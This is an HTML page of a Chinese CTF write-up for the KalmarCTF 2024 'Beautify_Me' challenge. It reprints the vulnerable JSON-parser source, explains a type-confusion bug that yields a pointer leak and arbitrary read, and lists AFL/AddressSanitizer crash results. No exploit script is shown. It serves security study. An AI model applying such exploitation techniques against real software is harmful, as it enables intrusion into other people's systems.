@@ -1,0 +1,632 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8" />
+        
+      <meta name="description" content="Boom? PWN ! ! !" />
+      
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>KalmarCTF2024 Beautify_Me |  北极落小雪</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+  </html>
+</html>
+
+
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-KalmarCTF2024 Beautify_Me"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  KalmarCTF2024 Beautify_Me
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2024/KalmarCTF2024%20Beautify_Me/" class="article-date">
+  <time datetime="2024-08-20T16:00:00.000Z" itemprop="datePublished">2024-08-21</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/ctf%E5%A4%8D%E7%8E%B0/">ctf复现</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">2.5k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">12 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>厌倦国内比赛一上来给一个裸的洞或者说一些极端情形的利用.<br>Pwn还是要建立在应用下才有意思啊.</p>
+<span id="more"></span>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>程序是一个json美化器.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/20240812130920.png"></p>
+<p>程序流程主要分解析和输出两部分.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">()</span> {</span><br><span class="line">    <span class="type">json_t</span> *obj;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IOLBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IOFBF, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">if</span> (fgets(buf, <span class="keyword">sizeof</span>(buf), <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span> (parse_value(buf, &amp;obj) == <span class="literal">NULL</span>) {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Invalid JSON!\n"</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        }</span><br><span class="line">        print_value(obj, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        free_value(obj);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+
+<p>解析过程主要是以递归+dispatch的形式进行(解析json的惯用方法).</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">parse_value</span> <span class="params">(<span class="type">char</span> *s, <span class="type">json_t</span> **out)</span> {</span><br><span class="line">    s = skip_whitespace(s);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*s == <span class="string">'{'</span>) {</span><br><span class="line">        <span class="keyword">return</span> parse_object(++s, out);</span><br><span class="line">    } <span class="keyword">else</span> <span class="keyword">if</span> (*s == <span class="string">'['</span>) {</span><br><span class="line">        <span class="keyword">return</span> parse_array(++s, out);</span><br><span class="line">    } <span class="keyword">else</span> <span class="keyword">if</span> (*s == <span class="string">'"'</span>) {</span><br><span class="line">        <span class="type">char</span> *end = <span class="built_in">strchr</span>(++s, <span class="string">'"'</span>);</span><br><span class="line">        <span class="keyword">if</span> (end == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="type">json_t</span> *data = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">json_t</span>));</span><br><span class="line">        data-&gt;type = T_STRING;</span><br><span class="line">        data-&gt;<span class="built_in">string</span> = strndup(s, end-s);</span><br><span class="line">        *out = data;</span><br><span class="line">        <span class="keyword">return</span> end+<span class="number">1</span>;</span><br><span class="line">    } <span class="keyword">else</span> <span class="keyword">if</span> (*s == <span class="string">'t'</span> || *s == <span class="string">'f'</span>) {</span><br><span class="line">        <span class="keyword">return</span> parse_bool(s, out);</span><br><span class="line">    } <span class="keyword">else</span> <span class="keyword">if</span> (*s == <span class="string">'n'</span>) {</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strncmp</span>(s, <span class="string">"null"</span>, <span class="number">4</span>) == <span class="number">0</span>) {</span><br><span class="line">            <span class="type">json_t</span> *data = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">json_t</span>));</span><br><span class="line">            <span class="keyword">if</span> (data == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            data-&gt;type = T_NULL;</span><br><span class="line">            *out = data;</span><br><span class="line">            <span class="keyword">return</span> s+<span class="number">4</span>;</span><br><span class="line">        }</span><br><span class="line">    } <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isdigit</span>(*s) || *s == <span class="string">'-'</span>) {</span><br><span class="line">        <span class="keyword">return</span> parse_number(s, out);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>从头文件中可以看出数据结构的组织方式:</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> <span class="title">type_t</span> {</span></span><br><span class="line">    T_NULL,</span><br><span class="line">    T_BOOL,</span><br><span class="line">    T_INT,</span><br><span class="line">    T_FLOAT,</span><br><span class="line">    T_STRING,</span><br><span class="line">    T_ARRAY,</span><br><span class="line">    T_OBJECT,</span><br><span class="line">} <span class="type">type_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Object</span> <span class="title">object_t</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Array</span> <span class="title">array_t</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Json</span> <span class="title">json_t</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Object</span> {</span></span><br><span class="line">    <span class="type">object_t</span> *next;</span><br><span class="line">    <span class="type">json_t</span> *key, *value;</span><br><span class="line">} <span class="type">object_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Array</span> {</span></span><br><span class="line">    <span class="type">array_t</span> *next;</span><br><span class="line">    <span class="type">json_t</span> *value;</span><br><span class="line">} <span class="type">array_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Json</span> {</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> {</span></span><br><span class="line">        <span class="type">object_t</span> *object;</span><br><span class="line">        <span class="type">array_t</span> *<span class="built_in">array</span>;</span><br><span class="line">        <span class="type">char</span> *<span class="built_in">string</span>;</span><br><span class="line">        <span class="type">char</span> boolean;</span><br><span class="line">        <span class="type">long</span> nint;</span><br><span class="line">        <span class="type">double</span> nfloat;</span><br><span class="line">    };</span><br><span class="line">    <span class="type">type_t</span> type;</span><br><span class="line">} <span class="type">json_t</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>先看object的解析方式, 可以发现一个问题是解析key的过程是调用的parse_value, 这意味着key可以是任何类型.先记住这一点, 待审完大体逻辑再回头分析.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">parse_object</span> <span class="params">(<span class="type">char</span> *s, <span class="type">json_t</span> **out)</span> {</span><br><span class="line">    <span class="type">json_t</span> *data = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">json_t</span>));</span><br><span class="line">    <span class="keyword">if</span> (data == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    data-&gt;type = T_OBJECT;</span><br><span class="line"></span><br><span class="line">    s = skip_whitespace(s);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*s == <span class="string">'}'</span>) {</span><br><span class="line">        data-&gt;object = <span class="literal">NULL</span>;</span><br><span class="line">        *out = data;</span><br><span class="line">        <span class="keyword">return</span> ++s;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    s = parse_object_element(s, &amp;data-&gt;object);</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="literal">NULL</span>) {</span><br><span class="line">        <span class="built_in">free</span>(data);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line">    *out = data;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">parse_object_element</span> <span class="params">(<span class="type">char</span> *s, <span class="type">object_t</span> **out)</span> {</span><br><span class="line">    <span class="type">object_t</span> *elem = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">object_t</span>));</span><br><span class="line">    <span class="keyword">if</span> (elem == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    s = parse_value(s, &amp;elem-&gt;key);</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="literal">NULL</span>) {</span><br><span class="line">        <span class="built_in">free</span>(elem);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    s = skip_whitespace(s);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*s != <span class="string">':'</span>) {</span><br><span class="line">        free_value(elem-&gt;key);</span><br><span class="line">        <span class="built_in">free</span>(elem);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    s = skip_whitespace(++s);</span><br><span class="line"></span><br><span class="line">    s = parse_value(s, &amp;elem-&gt;value);</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="literal">NULL</span>) {</span><br><span class="line">        free_value(elem-&gt;key);</span><br><span class="line">        <span class="built_in">free</span>(elem);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line">    s = skip_whitespace(s);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*s == <span class="string">'}'</span>) {</span><br><span class="line">        elem-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        *out = elem;</span><br><span class="line">        <span class="keyword">return</span> ++s;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (*s == <span class="string">','</span>) {</span><br><span class="line">        s = skip_whitespace(++s);</span><br><span class="line">        s = parse_object_element(s, &amp;elem-&gt;next);</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="literal">NULL</span>) {</span><br><span class="line">            free_value(elem-&gt;key);</span><br><span class="line">            free_value(elem-&gt;value);</span><br><span class="line">            <span class="built_in">free</span>(elem);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        }</span><br><span class="line">        *out = elem;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+
+<p>再看数组的解析方式, 并没有审出什么问题.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">parse_array</span> <span class="params">(<span class="type">char</span> *s, <span class="type">json_t</span> **out)</span> {</span><br><span class="line">    <span class="type">json_t</span> *data = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">json_t</span>));</span><br><span class="line">    <span class="keyword">if</span> (data == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    data-&gt;type = T_ARRAY;</span><br><span class="line"></span><br><span class="line">    s = skip_whitespace(s);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*s == <span class="string">']'</span>) {</span><br><span class="line">        data-&gt;<span class="built_in">array</span> = <span class="literal">NULL</span>;</span><br><span class="line">        *out = data;</span><br><span class="line">        <span class="keyword">return</span> ++s;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    s = parse_array_element(s, &amp;data-&gt;<span class="built_in">array</span>);</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="literal">NULL</span>) {</span><br><span class="line">        <span class="built_in">free</span>(data);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line">    *out = data;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">parse_array_element</span> <span class="params">(<span class="type">char</span> *s, <span class="type">array_t</span> **out)</span> {</span><br><span class="line">    <span class="type">array_t</span> *elem = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">array_t</span>));</span><br><span class="line">    <span class="keyword">if</span> (elem == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    s = parse_value(s, &amp;elem-&gt;value);</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="literal">NULL</span>) {</span><br><span class="line">        <span class="built_in">free</span>(elem);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    s = skip_whitespace(s);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*s == <span class="string">']'</span>) {</span><br><span class="line">        elem-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        *out = elem;</span><br><span class="line">        <span class="keyword">return</span> ++s;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (*s == <span class="string">','</span>) {</span><br><span class="line">        s = skip_whitespace(++s);</span><br><span class="line">        s = parse_array_element(s, &amp;elem-&gt;next);</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="literal">NULL</span>) {</span><br><span class="line">            free_value(elem-&gt;value);</span><br><span class="line">            <span class="built_in">free</span>(elem);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    *out = elem;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>其他类型的结构和解析方式比较简单, 也没有审出什么问题, 这里不展开了.</p>
+<p>再看输出的过程, 发现输出object类型的key时是直接使用的printf(“"%s": “, curr-&gt;key-&gt;string);. 默认key为string对象.<br>这个类型混淆漏洞给了我们泄露+任意读的能力.</p>
+<p>泄露: 将array混淆为string输出, 泄露出object-&gt;next.<br>任意读: 将INT混淆为string输出, 可以读出INT作为指针指向的数据.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">print_value</span> <span class="params">(<span class="type">json_t</span> *data, <span class="type">int</span> indent)</span> {</span><br><span class="line">    <span class="keyword">switch</span> (data-&gt;type) {</span><br><span class="line">        <span class="keyword">case</span> T_NULL:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"null"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> T_BOOL:</span><br><span class="line">            <span class="built_in">printf</span>(data-&gt;boolean ? <span class="string">"true"</span> : <span class="string">"false"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> T_INT:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%ld"</span>, data-&gt;nint);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> T_FLOAT:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%lf"</span>, data-&gt;nfloat);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> T_STRING:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\"%s\""</span>, data-&gt;<span class="built_in">string</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> T_ARRAY:</span><br><span class="line">            {</span><br><span class="line">                <span class="type">array_t</span> *curr = data-&gt;<span class="built_in">array</span>;</span><br><span class="line">                <span class="keyword">if</span> (curr == <span class="literal">NULL</span>) {</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"[]"</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                }</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"[\n"</span>);</span><br><span class="line">                <span class="keyword">while</span> (curr) {</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; indent+<span class="number">4</span>; i++) <span class="built_in">putchar</span>(<span class="string">' '</span>);</span><br><span class="line">                    print_value(curr-&gt;value, indent+<span class="number">4</span>);</span><br><span class="line">                    curr = curr-&gt;next;</span><br><span class="line">                    <span class="keyword">if</span> (curr) {</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">",\n"</span>);</span><br><span class="line">                    }</span><br><span class="line">                }</span><br><span class="line">                <span class="built_in">putchar</span>(<span class="string">'\n'</span>);</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; indent; i++) <span class="built_in">putchar</span>(<span class="string">' '</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"]"</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> T_OBJECT:</span><br><span class="line">            {</span><br><span class="line">                <span class="type">object_t</span> *curr = data-&gt;object;</span><br><span class="line">                <span class="keyword">if</span> (curr == <span class="literal">NULL</span>) {</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"{}"</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                }</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"{\n"</span>);</span><br><span class="line">                <span class="keyword">while</span> (curr) {</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; indent+<span class="number">4</span>; i++) <span class="built_in">putchar</span>(<span class="string">' '</span>);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"\"%s\": "</span>, curr-&gt;key-&gt;<span class="built_in">string</span>);</span><br><span class="line">                    print_value(curr-&gt;value, indent+<span class="number">4</span>);</span><br><span class="line">                    curr = curr-&gt;next;</span><br><span class="line">                    <span class="keyword">if</span> (curr) {</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">",\n"</span>);</span><br><span class="line">                    }</span><br><span class="line">                }</span><br><span class="line">                <span class="built_in">putchar</span>(<span class="string">'\n'</span>);</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; indent; i++) <span class="built_in">putchar</span>(<span class="string">' '</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"}"</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Invalid type!"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>但目前我们还没找到能破坏内存的漏洞, 再次审计无果后转向Fuzz. 文件格式解析的程序交给AFL即可.<br>最终得到以下结果:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(178, ' AddressSanitizer: SEGV /home/znl/pwn/2024_ctf_all/Kalmar/beautify-me/main.c:237:39 in print_value', 'SESSION000:id:000000,sig:11,src:000001,time:54,execs:111,op:quick,pos:39')</span><br><span class="line">(34, ' AddressSanitizer: SEGV /home/znl/pwn/2024_ctf_all/Kalmar/beautify-me/main.c:285:38 in free_value', 'SESSION000:id:000007,sig:11,src:000001,time:7660,execs:15827,op:havoc,rep:6')</span><br><span class="line">(12, ' AddressSanitizer: SEGV ld-temp.o in __sanitizer::internal_strlen(char const*)', 'SESSION000:id:000030,sig:11,src:000190,time:68542,execs:140361,op:quick,pos:101')</span><br></pre></td></tr></tbody></table></figure>
+
